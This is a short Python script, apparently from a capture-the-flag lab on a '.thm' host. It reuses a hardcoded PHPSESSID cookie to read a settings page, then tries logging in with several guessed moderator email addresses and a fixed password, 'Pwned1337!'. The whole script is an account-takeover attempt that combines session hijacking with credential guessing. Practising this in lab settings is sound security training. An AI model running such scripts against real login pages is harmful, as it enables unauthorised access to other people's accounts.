import requests, re

s = requests.Session()
s.cookies.set('PHPSESSID', 'k6qh5jtubf314jfo61sh1qk0d2')

# Look at full settings page for email input
r = s.get('http://10.82.129.17/settings.php')
# Find email-related input
idx = r.text.lower().find('email')
if idx >= 0:
    print('Email context:', r.text[max(0,idx-100):idx+300])

# Try common mod emails
candidates = [
    'mod@review.thm',
    'moderator@review.thm',
    'mod@sequence.thm',
    'mod@localhost',
]
print('\n--- Trying candidate emails ---')
for email in candidates:
    s2 = requests.Session()
    r2 = s2.post('http://10.82.129.17/login.php',
                 data={'email': email, 'password': 'Pwned1337!'},
                 allow_redirects=True)
    result = 'LOGIN OK' if 'login' not in r2.url else 'fail'
    print(f'  {email}: {result} -> {r2.url}')
